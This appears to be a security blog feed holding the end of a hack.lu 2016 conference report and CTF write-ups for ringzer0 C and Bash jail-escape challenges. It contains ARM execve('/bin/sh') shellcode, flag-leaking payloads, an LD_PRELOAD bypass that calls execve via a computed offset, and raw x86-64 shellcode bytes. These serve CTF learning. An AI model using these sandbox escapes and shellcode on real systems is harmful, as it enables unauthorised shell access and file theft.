.section .text
.global _start
_start:
    .code 32
    add     r3, pc, #1
    bx      r3
    
    .code 16
    add     r0, pc, #8
    mov     r1, #0
    mov     r2, #0
    mov     r7, #11          /* syscall 11, execve */
    svc     #0
    mov     r5, r5           /* NOP */

.ascii &#34;/bin/sh\0&#34;
</code></pre></div><p>However, <strong>de-NULLyfing</strong> the shellcode requires a good knowledge of the instruction set and how ARM works. A more complicated shellcode
(reverse shell) was also shown and aimed at understanding how one would write more complex shellcode. As a next step (was not part of the
workshop) one could dive deeper and write ROP gadgets for ARM. Now being more clear about how ROP works (see the workshop from Julien)
this should be a very good exercise. ALl in one this was also a very good workshop and Saumil is really competent hacker and speaker.
Next year he will be presenting some advanced <a href="https://recon.cx/2017/brussels/training/trainingexploitlab.html">ARM based exploitation techniques</a>
at the <a href="https://recon.cx/2017/brussels/">recon 2017 in Brussels</a>.</p>
<h2 id="conclusion">Conclusion</h2>
<p>I think it was a really successful conference with really cool people and a nice location. I&rsquo;ve really enjoyed
the conversations I&rsquo;ve had, especially during the refreshment breaks. Even though I haven&rsquo;t manage it to see
that many talks (actually only 1 - don&rsquo;t blame me for this), I think my learning curve after the workshops I&rsquo;ve
attended was pretty straightforward.</p>
<p>I would like to thank all the <strong>Key Super Secret Company</strong> guys for letting me join their dinner. If you guys
are reading this here, I hope to see you soon in Berlin :) And a big thanks goes to my <strong>Holy Romanian Water</strong>
connection: I had so much fun with you (we somehow managed it to get back to the hotel :D)!
To the <strong>Canadian fraction</strong>: Enjoy your trip and keep an eye for the <strong>big things</strong> (Sergei, ya know what I mean :P)
And last but not least a warm hug for my <strong>Romanian fellows</strong> for sharing their skills in dissecting&hellip; bronies!
And yes (how could I forget this?): Thank you <a href="https://2016.hack.lu">hack.lu</a> for organizing the whole stuff!
I hope to see you next year again.</p>
<h2 id="some-random-images">Some random images</h2>
<p>Some random images took during the days:</p>
<p><img src="/posts/img/2016/hack.lu/IMG_20161017_163538_1.jpg" alt=""></p>
<p><img src="/posts/img/2016/hack.lu/IMG_20161019_183422.jpg" alt=""></p>
<p><img src="/posts/img/2016/hack.lu/IMG_20161020_161742.jpg" alt=""></p>
<p><img src="/posts/img/2016/hack.lu/IMG_20161020_170506_1.jpg" alt=""></p>
<p><img src="/posts/img/2016/hack.lu/IMG_20161020_173631_1.jpg" alt=""></p>
]]></content:encoded>
    </item>
    
    <item>
      <title>ringzer0 CTF - Jail Escaping C </title>
      <link>https://blog.dornea.nu/2016/09/19/ringzer0-ctf-jail-escaping-c/</link>
      <pubDate>Mon, 19 Sep 2016 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2016/09/19/ringzer0-ctf-jail-escaping-c/</guid>
      <content:encoded><![CDATA[<p>Here are my solutions for the <a href="https://ringzer0team.com">ringzer0</a> <strong>Jail Escaping C</strong> challenges:</p>
<ul>
<li>Level 1: <a href="https://ringzer0team.com/challenges/228">https://ringzer0team.com/challenges/228</a></li>
<li>Level 2: <a href="https://ringzer0team.com/challenges/229">https://ringzer0team.com/challenges/229</a></li>
<li>Level 3: <a href="https://ringzer0team.com/challenges/230">https://ringzer0team.com/challenges/230</a></li>
</ul>
<h1 id="level-1">Level 1</h1>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">level1@ringzer0team.com&#39;s password: 
Last login: Sun Apr 24 05:48:42 2016 from

RingZer0 Team Online CTF

C Jail Level 1:
Current user is uid=1000(level1) gid=1000(level1) groups=1000(level1)

Flag is located at /home/level1/flag.txt

Challenge instruction:
-----------------------------

Type DONE to compile and execute your binary.


Your payload will be compiled that way:
gcc -O3 -Wall -fstack-protector-all -fPIE bin.c -o bin

Your payload will be executed that way:
LD_PRELOAD=./override.so ./bin

You only control the content of a function.

Here&#39;s the default includes
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;

You CANNOT use the &#34;asm&#34; keyword

-----------------------------
Your C code:
</code></pre></div><p>So obviously I have to write some C code to read the content of <code>/home/level1/flag.txt</code>. <code>fopen</code>/<code>fread</code> are not allowed so let&rsquo;s do it using <code>open</code>/<code>read</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;string.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdlib.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;unistd.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;fcntl.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;sys/types.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;sys/stat.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span><span style="color:#cd2828;font-weight:bold"></span>
<span style="color:#6ab825;font-weight:bold">int</span> <span style="color:#447fcf">main</span>(<span style="color:#6ab825;font-weight:bold">int</span> argc, <span style="color:#6ab825;font-weight:bold">char</span> **argv) {
    <span style="color:#6ab825;font-weight:bold">int</span> fd;
    <span style="color:#6ab825;font-weight:bold">char</span> *filename = <span style="color:#ed9d13">&#34;flag.txt&#34;</span>;
    ssize_t ret_in;
    <span style="color:#6ab825;font-weight:bold">char</span> buffer[<span style="color:#3677a9">100</span>];

    <span style="color:#999;font-style:italic">// Open file 
</span><span style="color:#999;font-style:italic"></span>    <span style="color:#6ab825;font-weight:bold">if</span> ((fd = open(filename, O_RDONLY)) &lt; <span style="color:#3677a9">0</span>){
        printf(<span style="color:#ed9d13">&#34;hello&#34;</span>);
    }

    <span style="color:#999;font-style:italic">// Read content
</span><span style="color:#999;font-style:italic"></span>    <span style="color:#6ab825;font-weight:bold">while</span> ((ret_in = read(fd, &amp;buffer, <span style="color:#3677a9">100</span>)) &gt; <span style="color:#3677a9">0</span>);

    <span style="color:#999;font-style:italic">// Print buffer
</span><span style="color:#999;font-style:italic"></span>    printf(<span style="color:#ed9d13">&#34;Flag: %s</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, buffer);
    <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#3677a9">0</span>;

}

</code></pre></div><p>Keep in mind that you&rsquo;ll have to paste only the contents of <code>main()</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c">----------------------------
Your C code:
  <span style="color:#6ab825;font-weight:bold">int</span> fd;
    <span style="color:#6ab825;font-weight:bold">char</span> *filename = <span style="color:#ed9d13">&#34;flag.txt&#34;</span>;
    ssize_t ret_in;
    <span style="color:#6ab825;font-weight:bold">char</span> buffer[<span style="color:#3677a9">100</span>];

    <span style="color:#999;font-style:italic">// Open file 
</span><span style="color:#999;font-style:italic"></span>    <span style="color:#6ab825;font-weight:bold">if</span> ((fd = open(filename, O_RDONLY)) &lt; <span style="color:#3677a9">0</span>){
        printf(<span style="color:#ed9d13">&#34;hello&#34;</span>);
    }

    <span style="color:#999;font-style:italic">// Read content
</span><span style="color:#999;font-style:italic"></span>    <span style="color:#6ab825;font-weight:bold">while</span> ((ret_in = read(fd, &amp;buffer, <span style="color:#3677a9">100</span>)) &gt; <span style="color:#3677a9">0</span>);

    <span style="color:#999;font-style:italic">// Print buffer
</span><span style="color:#999;font-style:italic"></span>    printf(<span style="color:#ed9d13">&#34;Flag: %s</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, buffer);
    <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#3677a9">0</span>;
DONE

-----------------------------
Compiling your code.
/tmp/ec5378ac-<span style="color:#3677a9">32f</span>b-<span style="color:#3677a9">4f</span><span style="color:#3677a9">92</span>-af6c-<span style="color:#3677a9">807569</span>d9a8be/bin.c: In function <span style="color:#a61717;background-color:#e3d2d2">â€˜</span>_ba91abe8889543278d28244379cec68d<span style="color:#a61717;background-color:#e3d2d2">â€™</span>:
/tmp/ec5378ac-<span style="color:#3677a9">32f</span>b-<span style="color:#3677a9">4f</span><span style="color:#3677a9">92</span>-af6c-<span style="color:#3677a9">807569</span>d9a8be/bin.c:<span style="color:#3677a9">27</span>:<span style="color:#3677a9">5</span>: warning: <span style="color:#a61717;background-color:#e3d2d2">â€˜</span><span style="color:#6ab825;font-weight:bold">return</span><span style="color:#a61717;background-color:#e3d2d2">â€™</span> with a value, in function returning <span style="color:#6ab825;font-weight:bold">void</span> [enabled by <span style="color:#6ab825;font-weight:bold">default</span>]
     <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#3677a9">0</span>;
     ^
Executing your code.
Flag: FLAG-ql3mI2Z8fGq56kK5QdwK8oMxgWwvji8R
</code></pre></div><h1 id="level-2">Level 2</h1>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c">RingZer0 Team Online CTF

C Jail Level <span style="color:#3677a9">2</span>:
Current user is uid=<span style="color:#3677a9">1001</span>(level2) gid=<span style="color:#3677a9">1001</span>(level2) groups=<span style="color:#3677a9">1001</span>(level2)

Flag is located at /home/level2/flag.txt

Challenge instruction:
-----------------------------

Type DONE to compile and execute your binary.


Your payload will be compiled that way:
gcc -O3 -Wall -fstack-protector-all -fPIE bin.c -o bin

Your payload will be executed that way:
LD_PRELOAD=./override.so ./bin

You only control the content of a function.

Here<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>s the <span style="color:#6ab825;font-weight:bold">default</span> includes
<span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;string.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdlib.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;unistd.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;fcntl.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;sys/types.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;sys/stat.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span><span style="color:#cd2828;font-weight:bold"></span>
You CANNOT use the <span style="color:#ed9d13">&#34;asm&#34;</span> keyword

-----------------------------
Your C code:
</code></pre></div><p>Pretty much the same as in the first challenge. However, some functions like <code>fopen</code>, <code>open</code>, <code>fdopen</code> were not allowed. Finally I bought the hint:</p>
<blockquote>
<p>Is there a 64 bits wrapper for open?</p>
</blockquote>
<p>And of course there is <code>open64()</code>. <code>open()</code> and <code>open64()</code> use the <code>open</code> <strong>syscall</strong> internally. The main difference is that <code>open64()</code> is equivalent
to <code>open()</code> with <em>O_LARGEFILE</em> in order to support <strong>large</strong> files in 32 bit applications. Here is my solution (shitty code, don&rsquo;t use in production :D):</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c">-----------------------------
Your C code:
   <span style="color:#6ab825;font-weight:bold">char</span> buffer[<span style="color:#3677a9">100</span>];
    FILE *fp;
    <span style="color:#6ab825;font-weight:bold">int</span> fd;
    fd = open64(<span style="color:#ed9d13">&#34;flag.txt&#34;</span>, O_RDONLY);
    pread64(fd, buffer, <span style="color:#3677a9">100</span>, <span style="color:#3677a9">0</span>);
    printf(<span style="color:#ed9d13">&#34;flag: %s</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, buffer);
DONE

-----------------------------
Compiling your code.
/tmp/<span style="color:#3677a9">41</span>d5ddc3-<span style="color:#3677a9">8</span>d6b-<span style="color:#3677a9">42</span>ce-a2cf-<span style="color:#3677a9">1026f</span>cfe463f/bin.c: In function <span style="color:#a61717;background-color:#e3d2d2">â€˜</span>_4fa8c04676486ca36ba261f8387a2b9d<span style="color:#a61717;background-color:#e3d2d2">â€™</span>:
/tmp/<span style="color:#3677a9">41</span>d5ddc3-<span style="color:#3677a9">8</span>d6b-<span style="color:#3677a9">42</span>ce-a2cf-<span style="color:#3677a9">1026f</span>cfe463f/bin.c:<span style="color:#3677a9">15</span>:<span style="color:#3677a9">5</span>: warning: implicit declaration of function <span style="color:#a61717;background-color:#e3d2d2">â€˜</span>open64<span style="color:#a61717;background-color:#e3d2d2">â€™</span> [-Wimplicit-function-declaration]
     fd = open64(<span style="color:#ed9d13">&#34;flag.txt&#34;</span>, O_RDONLY);
     ^
/tmp/<span style="color:#3677a9">41</span>d5ddc3-<span style="color:#3677a9">8</span>d6b-<span style="color:#3677a9">42</span>ce-a2cf-<span style="color:#3677a9">1026f</span>cfe463f/bin.c:<span style="color:#3677a9">16</span>:<span style="color:#3677a9">5</span>: warning: implicit declaration of function <span style="color:#a61717;background-color:#e3d2d2">â€˜</span>pread64<span style="color:#a61717;background-color:#e3d2d2">â€™</span> [-Wimplicit-function-declaration]
     pread64(fd, buffer, <span style="color:#3677a9">100</span>, <span style="color:#3677a9">0</span>);
     ^
/tmp/<span style="color:#3677a9">41</span>d5ddc3-<span style="color:#3677a9">8</span>d6b-<span style="color:#3677a9">42</span>ce-a2cf-<span style="color:#3677a9">1026f</span>cfe463f/bin.c:<span style="color:#3677a9">13</span>:<span style="color:#3677a9">11</span>: warning: unused variable <span style="color:#a61717;background-color:#e3d2d2">â€˜</span>fp<span style="color:#a61717;background-color:#e3d2d2">â€™</span> [-Wunused-variable]
     FILE *fp;
           ^
Executing your code.
flag: FLAG-<span style="color:#3677a9">0416</span>ewrN2o058901Aqf4w9hsyH0dfqzd
</code></pre></div><h1 id="level-3">Level 3</h1>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">RingZer0 Team Online CTF

C Jail Level 3:
Current user is uid=1002(level3) gid=1002(level3) groups=1002(level3)

Flag is located at /home/level3/flag.txt

Challenge instruction:
-----------------------------

Type DONE to compile and execute your binary.


Your payload will be compiled that way:
gcc -O3 -Wall -fstack-protector-all -fPIE bin.c -o bin

Your payload will be executed that way:
LD_PRELOAD=./override.so ./bin

You only control the content of a function.

Here&#39;s the default includes
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;

You CANNOT use the &#34;asm,open,read,mmap,brk,sh,#,sys,\x&#34; keyword

-----------------------------
Your C code:

</code></pre></div><p>I must admit that although this challenge wasn&rsquo;t that difficult it took me way to much time to find a reasonable solution. My first ideea
was to write <code>shellcode</code> that would read <code>flag.txt</code> and dump its content.  This is also the reason I wrote <a href="http://blog.dornea.nu/2016/08/23/testing-shellcodes/">&ldquo;Testing Shellcodes&rdquo;</a>. However, I&rsquo;ve noticed that <code>\x</code> (hex code) couldn&rsquo;t be used as a keyword. Instead of <em>giving up</em> my
first idea I should have think of some way how to re-write those hex codes to sth different: <em>octal</em> values or <em>integer</em> values of <em>chars</em>. That way I would have had bypassed the <code>\x</code> restriction.</p>
<p>First I&rsquo;ll try to write down my thoughts which lead to the solution. Afterwards I&rsquo;ll show some other cool solutions I&rsquo;ve seen in the write-ups.</p>
<h2 id="my-solution">My solution</h2>
<p>After trying hard I&rsquo;ve decided to buy the hint:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">alias for old system?</span><span style="color:#cd2828;font-weight:bold">
</span></code></pre></div><p>Then I was looking for another <em>preprocessor</em> directives meant to <em>embed</em>/<em>include</em> code in other files. But I didn&rsquo;t find sth useful. Besides
that all preprocessor directives start with &lsquo;#&rsquo; which was a bad keyword. However, this assumption was wrong.</p>
<p>Somebody told me then that I should look for an &ldquo;old function&rdquo; which could do the same. Functions, you say. All&rsquo;right! At (<a href="https://www.gnu.org/software/libc/manual/html_node/Function-Index.html)%5Bhttps://www.gnu.org/software/libc/manual/html_node/Function-Index.html%5D">https://www.gnu.org/software/libc/manual/html_node/Function-Index.html)[https://www.gnu.org/software/libc/manual/html_node/Function-Index.html]</a> you can find all
<em>libc</em> functions available. But I had to do some filtering:</p>
<ul>
<li>since the <em>open</em> and <em>read</em> keywords weren&rsquo;t allowed, I wasn&rsquo;t able to create any <em>file streams</em> (FILE *) or <em>file descriptors</em> (int fd)
<ul>
<li>that means that all functions taking a <code>FILE *</code> pointer or a file descriptor <code>int fd</code> weren&rsquo;t suitable</li>
</ul>
</li>
<li>the <code>exec*</code> family (execl, execlp, execle, execv, execvp, execvpe) was also not a good ideea since these functions were disabled by the <code>LD_PRELOAD</code> override</li>
<li><code>malloc</code> was also disabled by the override so no functions using malloc internally could be used</li>
</ul>
<p>Finally I was desperately searching for some functions but I couldn&rsquo;t find one. I think I was overthinking the solution way to much: I
was hoping to find a <em>function</em> (in the context of C code) which would then <em>include</em> <code>flag.txt</code> and try to interpret its content as valid
C code. Since the flag file contains no valid code, the compiler will then produce some error messages which hopefully will dump the flag
inside <code>flag.txt</code>. Unfortunately after &ldquo;parsing&rdquo; the libc functions index site I couldn&rsquo;t find anything.</p>
<p>Finally, somebody (thx nsr @nullsecurity.net IRC channel) told that there might be a way to accomplish &ldquo;#include&rdquo; without using &ldquo;#&rdquo;. The hint
I was after was called <a href="https://en.wikipedia.org/wiki/Digraphs_and_trigraphs">Digraphs/Trigraphs</a>. Especially for the C language the preprocessor
is able to replace digraphs/trigraphs by their <a href="https://en.wikipedia.org/wiki/Digraphs_and_trigraphs#C">single-character equivalents before any other processing</a>. This way I was able to trigger the error message I was hoping for:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Your C code:
%:include &#34;/home/level3/flag.txt&#34;
DONE

-----------------------------
Compiling your code.
In file included from /tmp/1b9dd64e-70af-40cf-95b5-d4ef0593247c/bin.c:13:0:
/home/level3/flag.txt: In function â€˜_24f9c1e3682289873677f3f7f79ea8dfâ€™:
/home/level3/flag.txt:1:1: error: â€˜FLAGâ€™ undeclared (first use in this function)
 FLAG-BE79t326XS03122r5A4206tv395P64WB
 ^
/home/level3/flag.txt:1:1: note: each undeclared identifier is reported only once for each function it appears in
/home/level3/flag.txt:1:6: error: â€˜BE79t326XS03122r5A4206tv395P64WBâ€™ undeclared (first use in this function)
 FLAG-BE79t326XS03122r5A4206tv395P64WB
      ^
/tmp/1b9dd64e-70af-40cf-95b5-d4ef0593247c/bin.c:16:1: error: expected â€˜;â€™ before â€˜}â€™ token
 }
 ^
Your code does not compile.
</code></pre></div><p>There we go: <code>FLAG-BE79t326XS03122r5A4206tv395P64WB</code></p>
<h2 id="other-solutions">Other solutions</h2>
<h3 id="bypass-ld_preload">Bypass LD_PRELOAD</h3>
<p>As I&rsquo;ve noticed some functions (among these also <code>execve()</code>) were disabled due to the <code>LD_PRELOAD</code> override. Some <a href="https://ringzer0team.com/profile/2319">smart guy</a> managed it to find in memory the real libc functions and thus bypassing the <code>LD_PRELOAD</code> override. Using <a href="http://libcdb.com">libcdb.com</a> you can identify the exact version of the used libc version by finding out the addresses of some functions (in his case <code>puts</code> and <code>printf</code>):</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Compiling your code.
Executing your code.
puts: 0x7ffe36166e30
printf: 0x7ffe3614b400
</code></pre></div><p>After finding the exact libc version, he/she downloaded the file and had a look at it:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ readelf -s libc-2.19_15.so | grep puts
   184: 000000000006fe30   399 FUNC    GLOBAL DEFAULT   12 _IO_puts@@GLIBC_2.2.5
   400: 000000000006fe30   399 FUNC    WEAK   DEFAULT   12 puts@@GLIBC_2.2.5      &lt;--- the one we have
   471: 00000000000fef10  1031 FUNC    GLOBAL DEFAULT   12 putspent@@GLIBC_2.2.5      
   644: 0000000000100900   555 FUNC    GLOBAL DEFAULT   12 putsgent@@GLIBC_2.10
  1089: 000000000006e730   303 FUNC    WEAK   DEFAULT   12 fputs@@GLIBC_2.2.5
  1597: 000000000006e730   303 FUNC    GLOBAL DEFAULT   12 _IO_fputs@@GLIBC_2.2.5
  2199: 0000000000073a80    95 FUNC    GLOBAL DEFAULT   12 fputs_unlocked@@GLIBC_2.2.5

$ greadelf -s libc-2.19_15.so | grep execve
   987: 00000000000c1360   200 FUNC    GLOBAL DEFAULT   12 fexecve@@GLIBC_2.2.5
  1418: 00000000000c1330    34 FUNC    WEAK   DEFAULT   12 execve@@GLIBC_2.2.5    &lt;--- the one we want
</code></pre></div><p>By calculating the offset between <code>puts</code> and <code>execve</code> he/she could then build following code:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#6ab825;font-weight:bold">int</span> (*real_execve)(<span style="color:#6ab825;font-weight:bold">const</span> <span style="color:#6ab825;font-weight:bold">char</span> *, <span style="color:#6ab825;font-weight:bold">char</span> *<span style="color:#6ab825;font-weight:bold">const</span> *, <span style="color:#6ab825;font-weight:bold">char</span> * <span style="color:#6ab825;font-weight:bold">const</span> *) = (<span style="color:#6ab825;font-weight:bold">void</span>*)puts + &lt;OFFSET&gt;;
<span style="color:#6ab825;font-weight:bold">char</span> program[] = {<span style="color:#3677a9">47</span>, <span style="color:#3677a9">98</span>, <span style="color:#3677a9">105</span>, <span style="color:#3677a9">110</span>, <span style="color:#3677a9">47</span>, <span style="color:#3677a9">98</span>, <span style="color:#3677a9">97</span>, <span style="color:#3677a9">115</span>, <span style="color:#3677a9">104</span>, <span style="color:#3677a9">0</span>};
real_execve(program, <span style="color:#3677a9">0</span>, <span style="color:#3677a9">0</span>);
</code></pre></div><p>Clever!</p>
<h3 id="execute-shellcode">Execute shellcode</h3>
<p>Since I was initially trying to execute shellcode, I was very curios about any similar solutions. <a href="https://ringzer0team.com/profile/5732">killer2</a> had a very elegant solution:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#999;font-style:italic">// Place the shellcode inside the .text section
</span><span style="color:#999;font-style:italic"></span><span style="color:#6ab825;font-weight:bold">static</span> <span style="color:#6ab825;font-weight:bold">const</span> <span style="color:#6ab825;font-weight:bold">char</span> <span style="color:#447fcf">__attribute__</span>((section (<span style="color:#ed9d13">&#34;.text&#34;</span>))) code[] = { <span style="color:#3677a9">72</span>,<span style="color:#3677a9">129</span>,<span style="color:#3677a9">236</span>,<span style="color:#3677a9">255</span>,<span style="color:#3677a9">15</span>,<span style="color:#3677a9">0</span>,<span style="color:#3677a9">0</span>,<span style="color:#3677a9">72</span>,<span style="color:#3677a9">49</span>,<span style="color:#3677a9">255</span>,<span style="color:#3677a9">72</span>,<span style="color:#3677a9">141</span>,<span style="color:#3677a9">52</span>,<span style="color:#3677a9">36</span>,<span style="color:#3677a9">106</span>,<span style="color:#3677a9">50</span>,<span style="color:#3677a9">90</span>,<span style="color:#3677a9">72</span>,<span style="color:#3677a9">49</span>,<span style="color:#3677a9">192</span>,<span style="color:#3677a9">15</span>,<span style="color:#3677a9">5</span>,<span style="color:#3677a9">72</span>,<span style="color:#3677a9">135</span>,<span style="color:#3677a9">254</span>,<span style="color:#3677a9">72</span>,<span style="color:#3677a9">49</span>,<span style="color:#3677a9">246</span>,<span style="color:#3677a9">106</span>,<span style="color:#3677a9">2</span>,<span style="color:#3677a9">88</span>,<span style="color:#3677a9">15</span>,<span style="color:#3677a9">5</span>,<span style="color:#3677a9">72</span>,<span style="color:#3677a9">141</span>,<span style="color:#3677a9">52</span>,<span style="color:#3677a9">36</span>,<span style="color:#3677a9">106</span>,<span style="color:#3677a9">100</span>,<span style="color:#3677a9">90</span>,<span style="color:#3677a9">72</span>,<span style="color:#3677a9">151</span>,<span style="color:#3677a9">72</span>,<span style="color:#3677a9">49</span>,<span style="color:#3677a9">192</span>,<span style="color:#3677a9">15</span>,<span style="color:#3677a9">5</span>,<span style="color:#3677a9">106</span>,<span style="color:#3677a9">1</span>,<span style="color:#3677a9">95</span>,<span style="color:#3677a9">72</span>,<span style="color:#3677a9">137</span>,<span style="color:#3677a9">194</span>,<span style="color:#3677a9">106</span>,<span style="color:#3677a9">1</span>,<span style="color:#3677a9">88</span>,<span style="color:#3677a9">15</span>,<span style="color:#3677a9">5</span>,<span style="color:#3677a9">72</span>,<span style="color:#3677a9">129</span>,<span style="color:#3677a9">196</span>,<span style="color:#3677a9">255</span>,<span style="color:#3677a9">15</span>,<span style="color:#3677a9">0</span>,<span style="color:#3677a9">0</span>,<span style="color:#3677a9">195</span> };

<span style="color:#999;font-style:italic">// Run the shellcode
</span><span style="color:#999;font-style:italic"></span>(*(<span style="color:#6ab825;font-weight:bold">void</span>(*)())code)();
</code></pre></div><p>Nice!</p>
<blockquote>
<p>You can find <a href="https://gcc.gnu.org/onlinedocs/gcc-4.0.0/gcc/Function-Attributes.html">here</a> more information about function attributes.</p>
</blockquote>
]]></content:encoded>
    </item>
    
    <item>
      <title>ringzer0 CTF - Jail Escaping Bash</title>
      <link>https://blog.dornea.nu/2016/06/20/ringzer0-ctf-jail-escaping-bash/</link>
      <pubDate>Mon, 20 Jun 2016 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2016/06/20/ringzer0-ctf-jail-escaping-bash/</guid>
      <content:encoded><![CDATA[<p>Here are my solutions for the <a href="https://ringzer0team.com">ringzer0</a> <strong>Jail Escaping</strong> shell challenges.</p>
<h1 id="level1">Level1</h1>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">evel1@ringzer0team.com&#39;s password: 

RingZer0 Team Online CTF

BASH Jail Level 1:
Current user is uid=1000(level1) gid=1000(level1) groups=1000(level1)

Flag is located at /home/level1/flag.txt

Challenge bash code:
-----------------------------

while :
do
        echo &#34;Your input:&#34;
        read input
        output=`$input`
done 

-----------------------------
</code></pre></div><p>You can spawn a shell using:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">/bin/bash
</code></pre></div><p>Although you <strong>can&rsquo;t read</strong> (you could redirect <em>stdout</em> to <em>stderr</em>) files, you can try to <strong>run</strong> commands based on the file content:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">level1@lxc17-bash-jail:~$ awk &#39;{system(&#34;wc &#34;$1)}&#39; /home/level1/flag.txt 
wc: FLAG-U96l4k6m72a051GgE5EN0rA85499172K: No such file or directory
</code></pre></div><h1 id="level-2">Level 2</h1>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">level2@ringzer0team.com&#39;s password: 

RingZer0 Team Online CTF

BASH Jail Level 2:
Current user is uid=1001(level2) gid=1001(level2) groups=1001(level2)

Flag is located at /home/level2/flag.txt

Challenge bash code:
-----------------------------

function check_space {
        if [[ $1 == *[bdks&#39;;&#39;&#39;&amp;&#39;&#39; &#39;]* ]]
        then 
                return 0
        fi

        return 1
}

while :
do
        echo &#34;Your input:&#34;
        read input
        if check_space &#34;$input&#34; 
        then
                echo -e &#39;\033[0;31mRestricted characters has been used\033[0m&#39;
        else
                output=&#34;echo Your command is: $input&#34;
                eval $output
        fi
done 

-----------------------------
Your input:
